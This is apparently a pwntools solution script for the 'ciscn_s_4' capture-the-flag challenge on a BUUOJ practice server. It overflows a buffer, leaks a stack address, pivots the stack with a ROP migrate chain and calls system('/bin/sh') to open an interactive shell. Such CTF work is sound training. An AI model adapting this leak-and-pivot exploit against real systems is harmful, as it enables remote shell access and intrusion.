from pwn import *

context.arch = 'i386'

elf = ELF('./ciscn_s_4')

system_call = 0x8048559

p = remote('node4.buuoj.cn', 27307)

p.recvline()
p.send(b'a' * 0x28)
p.recv(0x2F)
buffer_address = unpack(p.recv(4)) - 0x38
migrate_chain = ROP([elf])
migrate_chain.migrate(buffer_address)
p.send(flat([system_call, buffer_address + 0x8]) + b'/bin/sh\x00' + b'a' * 0x14 + migrate_chain.chain())
p.recvuntil('/bin/sh\n')
p.interactive()
